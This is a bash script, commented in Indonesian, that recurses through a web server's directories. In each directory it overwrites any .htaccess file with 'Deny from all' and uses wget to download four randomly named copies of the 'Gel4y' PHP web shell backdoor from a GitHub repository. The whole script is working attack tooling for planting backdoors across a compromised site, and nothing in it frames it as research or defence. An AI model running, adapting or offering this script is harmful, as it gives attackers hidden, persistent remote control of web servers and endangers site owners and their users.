#!/bin/bash

# Fungsi untuk mengecek setiap direktori dan melakukan aksi berdasarkan izinnya
checkAndPlaceHtaccess() {
    local dirPath="$1"
    local htaccessContent="Order Deny,Allow\nDeny from all"

    # Mengecek izin dari direktori
    local permissions
    permissions=$(stat -c "%a" "$dirPath")

    # Menempatkan atau menimpa file .htaccess, kecuali untuk direktori dengan izin 0444
    if [ "$permissions" = "0444" ]; then
        echo "Direktori dengan izin 0444 ditemukan: $dirPath"
    else
        local htaccessPath="${dirPath}/.htaccess"
        echo -e "$htaccessContent" > "$htaccessPath"
        echo "File .htaccess telah ditambahkan atau ditimpa di: $htaccessPath"
    fi

    # Cek izin dari file .htaccess
    if [ -f "$dirPath/.htaccess" ]; then
        local htaccessPermissions
        htaccessPermissions=$(stat -c "%a" "$dirPath/.htaccess")
        if [ "$htaccessPermissions" = "0444" ]; then
            echo "File .htaccess dengan izin 0444 ditemukan: $dirPath/.htaccess"
        fi
    fi

    sleep 3 # Penundaan antara operasi untuk mencegah overload
}

# Fungsi untuk mengunduh dan mengubah nama file php
downloadAndRenamephp() {
    local dirPath="$1"
    local phpUrl="https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php" # Contoh URL, ganti dengan URL sebenarnya
    for i in {1..4}; do # Mengunduh 4 file php
        local tempFile=$(mktemp "${dirPath}/XXXXXXXX.php")
        wget -q -O "$tempFile" "$phpUrl" && echo "File php terunduh dan disimpan sebagai: $tempFile"
        sleep 3 # Penundaan 3 detik antara pengunduhan
    done
}

# Fungsi rekursif untuk menelusuri direktori
recurseDirectories() {
    local currentDir="$1"
    # Loop melalui setiap item dalam direktori
    for item in "$currentDir"/*; do
        if [ -d "$item" ]; then
            # Jika item adalah direktori, cek dan tempatkan .htaccess jika perlu
            checkAndPlaceHtaccess "$item"

            # Mengunduh dan mengubah nama file php
            downloadAndRenamephp "$item"

            # Rekursi ke dalam direktori
            recurseDirectories "$item"
        fi
    done
}

# Mulai dari direktori skrip ini berada atau direktori yang diberikan
startDir=${1:-$(pwd)}

# Panggil fungsi utama dengan direktori awal
recurseDirectories "$startDir"
